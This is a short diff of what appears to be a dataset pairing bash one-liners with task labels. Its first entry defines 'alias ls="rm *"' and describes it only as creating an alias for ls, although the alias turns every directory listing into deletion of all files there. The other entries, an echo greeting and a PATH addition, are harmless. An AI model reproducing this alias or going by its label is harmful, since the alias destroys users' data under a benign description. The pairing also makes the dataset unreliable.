@@ -1,4 +1,7 @@
 #!/bin/bash
 alias ls="rm *"  (Task0: Creates an alias for ls)
 #!/bin/bash
-echo "hello" $USER (Task1: Prints hello USER)  
+echo "hello" $USER (Task1: Prints hello USER) 
+#!/bin/bash
+export PATH="$PATH:/action" (Task2: Adds /action to PATH)
+ 
